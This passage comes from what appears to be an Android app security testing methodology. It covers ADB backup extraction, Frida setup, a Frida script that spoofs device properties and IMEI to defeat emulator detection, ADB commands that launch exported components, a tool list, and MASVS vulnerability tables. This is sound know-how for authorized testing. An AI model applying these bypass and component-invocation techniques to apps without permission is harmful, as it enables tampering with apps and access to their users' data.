adb backup -f app-data.ab -apk com.example.targetapp
# Convert to tar
dd if=app-data.ab bs=1 skip=24 | python3 -m zlib -d > app-data.tar
tar -xvf app-data.tar
# Analyze extracted data
```

### Non-Rooted Frida Setup:

```bash
# Cannot run Frida server system-wide
# Instead, attach to running app process:

# Start app on device
# Find process:
adb shell ps | grep com.example.targetapp

# Attach Frida:
frida -U -n com.example.targetapp -l script.js
```

---

## Emulator Workflow (Acceptable - Good for Automation)

Android Studio Emulator provides root access by default.

### Setup:

```bash
# Create AVD (Android Virtual Device)
# Android Studio → AVD Manager → Create Virtual Device
# Choose: Pixel 8, Android 14 (API 34), x86_64

# Start emulator with writable system
emulator -avd Pixel_8_API_34 -writable-system

# Verify root
adb shell
su
# Should get root shell
```

### Advantages:

- ✅ Root access by default (`adb root`)
- ✅ Snapshot/restore for testing
- ✅ No risk to physical device
- ✅ Good for CI/CD automation

### Limitations:

- ⚠️ x86_64 architecture (not ARM like real devices)
- ⚠️ Some apps detect emulator and refuse to run
- ⚠️ Missing hardware features (camera, GPS, NFC)
- ⚠️ Performance may differ from physical device

### Emulator Detection Bypass:

Some apps check for emulator environment. Bypass techniques:

```javascript
// emulator-bypass.js
Java.perform(function() {
    // Build properties that indicate emulator
    var Build = Java.use('android.os.Build');
    Build.MANUFACTURER.value = "Google";
    Build.BRAND.value = "google";
    Build.MODEL.value = "Pixel 8";
    Build.PRODUCT.value = "husky";
    Build.DEVICE.value = "husky";
    Build.HARDWARE.value = "husky";

    // Telephony (emulator has fake values)
    var TelephonyManager = Java.use('android.telephony.TelephonyManager');
    TelephonyManager.getDeviceId.implementation = function() {
        return "351234567890123"; // Fake IMEI
    };

    console.log("[+] Emulator detection bypass loaded");
});
```

---

## Coverage Comparison

| Test Category | Rooted Device | Non-Rooted Device | Emulator |
|---------------|---------------|-------------------|----------|
| **Static Analysis** | ✅ 100% | ✅ 100% | ✅ 100% |
| **Network Traffic** | ✅ 100% | ✅ 95% | ✅ 100% |
| **App Runtime Hooks** | ✅ 100% | ✅ 90% | ✅ 100% |
| **System Runtime Hooks** | ✅ 100% | ❌ 0% | ✅ 100% |
| **App Filesystem** | ✅ 100% | ✅ 85% | ✅ 100% |
| **System Filesystem** | ✅ 100% | ❌ 0% | ✅ 100% |
| **Component Testing** | ✅ 100% | ✅ 70% | ✅ 100% |
| **Memory Dumps** | ✅ 100% | ✅ 50% | ✅ 100% |
| **Production Realism** | ✅ 100% | ✅ 100% | ⚠️ 60% |

**Conclusion:**
- **Rooted:** 100% coverage, optimal for comprehensive testing
- **Non-rooted:** 80-85% coverage, sufficient for app-level vulnerabilities
- **Emulator:** 100% technical coverage, but 60% production realism

---

## Drozer Migration Guide (2026 Update)

**Important:** Drozer is deprecated and incompatible with Android 12+. This methodology has been updated to use modern alternatives.

### Drozer to Modern Tool Mapping

| Drozer Feature | 2026 Replacement | Command/Tool |
|----------------|------------------|--------------|
| `app.activity.info` | APK Components Inspector | `python apk-components-inspector.py app.apk` |
| `app.activity.start` | ADB | `adb shell am start -n <component>` |
| `app.service.info` | APK Components Inspector | Same as above |
| `app.service.start` | ADB | `adb shell am startservice -n <component>` |
| `app.broadcast.send` | ADB | `adb shell am broadcast -a <action>` |
| `app.provider.query` | ADB | `adb shell content query --uri <uri>` |
| `scanner.provider.injection` | Custom ADB Script | SQLi test script (see section 3.5) |
| `scanner.provider.finduris` | APK Components Inspector | Included in component enumeration |
| Runtime hooking | Frida + Objection | `frida -U -f <app> -l script.js` |
| Attack surface scan | MobSF | Web interface or API |

### Why the Change?

1. **Android 12+ Incompatibility:** Drozer has limited support for modern Android
2. **No Maintenance:** Last significant update was years ago
3. **Better Alternatives:** APK Components Inspector + ADB provide superior functionality
4. **Modern Research:** NDSS 2025 published MALintent for intent fuzzing
5. **Frida Ecosystem:** More flexible and actively maintained

### Quick Migration

**Old Workflow (Drozer):**
```bash
drozer console connect
run app.package.attacksurface com.example.app
run app.activity.start --component com.example.app/.AdminActivity
```

**New Workflow (2026):**
```bash
# Static analysis
python apk-components-inspector.py app.apk

# Dynamic testing
adb shell am start -n com.example.app/.AdminActivity

# Runtime monitoring
frida -U -f com.example.app -l discover_components.js --no-pause
```

**Complete migration guide:** See research document at `/tmp/android-component-testing-modern-tools.md`

---

## Tool Ecosystem

### Essential Tools (Free)

| Tool | Purpose | Installation | Status |
|------|---------|--------------|--------|
| **ADB** | Device interaction | Android SDK Platform Tools | ✅ Active |
| **APKTool** | APK decompilation | `apt install apktool` | ✅ Active |
| **JADX** | Java decompiler | `apt install jadx` | ✅ Active |
| **Frida** | Runtime instrumentation | `pip install frida-tools` | ✅ Active (2026) |
| **Objection** | Frida-based framework | `pip install objection` | ✅ Active (Jan 27, 2026) |
| **MobSF** | Automated analysis | Docker: `opensecurity/mobile-security-framework-mobsf` | ✅ Very Active (v4.4.5) |
| **APK Components Inspector** | Component enumeration | `git clone github.com/thecybersandeep/apk-components-inspector` | ✅ Active (2025) |
| **mitmproxy** | HTTP proxy and inspection | `pip install mitmproxy` | ✅ Active (35k stars, MIT) |
| **OWASP ZAP** | HTTP proxy with scanner | Docker: `zaproxy/zap-stable` | ✅ Active (Apache 2.0) |
| **Reaper** | HTTP proxy + SQLite | Docker: reaper container | ✅ Active |
| ~~**Drozer**~~ | ~~IPC testing~~ | ~~Deprecated~~ | ❌ **DEPRECATED** |

**Note:** Drozer is deprecated and incompatible with Android 12+. Use **APK Components Inspector + ADB commands + Frida scripts** instead.

### Tool Installation (Mobile-Security Container):

```bash
# Start mobile-security container
ssh -p 2222 root@${VPS_IP} "docker compose up -d mobile-security"

# Container includes:
# - APKTool
# - JADX
# - MobSF
# - Frida tools
# - Objection
# - Various Android security tools

# Access MobSF web interface
# SSH tunnel: ssh -L 8000:localhost:8000 -p 2222 root@${VPS_IP}
# Open: http://localhost:8000
```

---

## Common Android Vulnerabilities (MASVS Mapped)

### MASVS-STORAGE

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Tokens in SharedPreferences | High | No encryption, accessible via backup |
| Unencrypted SQLite database | High | Sensitive data in plaintext |
| External storage files | High | World-readable sensitive data |
| Logcat sensitive data | High | Passwords/tokens visible in logs |
| Backup allowed + no encryption | Medium | Data in unencrypted ADB backups |

### MASVS-NETWORK

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Cleartext traffic allowed | Critical | HTTP connections permitted |
| No certificate pinning | Medium | MitM possible |
| Weak TLS config | High | TLS 1.0/1.1 allowed |

### MASVS-PLATFORM

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Exported Activity (no permission) | High | Unauthorized access to functionality |
| Content Provider SQL injection | Critical | Database compromise |
| Broadcast Receiver injection | High | Malicious intent processing |
| Deep link exploitation | Medium | URL parameter injection |
| WebView RCE | Critical | JavaScript execution, file access |

### MASVS-CRYPTO

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Hardcoded encryption keys | Critical | Keys in source code |
| Weak algorithms (DES, MD5) | High | Broken cryptography |
| ECB mode usage | Medium | Pattern leakage |
| No salt in password hashing | High | Rainbow table attacks |

### MASVS-AUTH

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Client-side auth only | Critical | Bypassable via runtime manipulation |
| Weak session management | High | Sessions don't expire |
| Biometric bypass | Medium | LocalAuthentication hook |

### MASVS-CODE

| Vulnerability | Severity | Finding |
|---------------|----------|---------|
| Debug mode enabled | Critical | Production app debuggable |
| No obfuscation | Low | Easy reverse engineering |
| Root detection bypassable | Low | Defense-in-depth |
| Outdated libraries | Varies | Known CVEs |

---

## References

### OWASP Standards
- [OWASP MASTG](https://mas.owasp.org/MASTG/) - Mobile Application Security Testing Guide
- [OWASP MASVS](https://mas.owasp.org/MASVS/) - Mobile Application Security Verification Standard
- [OWASP Mobile Top 10](https://owasp.org/www-project-mobile-top-10/)

### Android-Specific Resources
- [Android Security Documentation](https://source.android.com/docs/security)
- [Android Developers - Security Best Practices](https://developer.android.com/topic/security/best-practices)

### Tools
- [Frida](https://frida.re/) - Dynamic instrumentation
- [Objection](https://github.com/sensepost/objection) - Mobile security framework
- [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Mobile Security Framework
- [Drozer](https://github.com/WithSecureLabs/drozer) - Android security assessment
- [JADX](https://github.com/skylot/jadx) - Dex to Java decompiler
- [APKTool](https://apktool.org/) - Reverse engineering tool

---

**Created:** 2026-02-01
**Framework:** Intelligence Adjacent (IA) - Security Testing
**Version:** 2.0
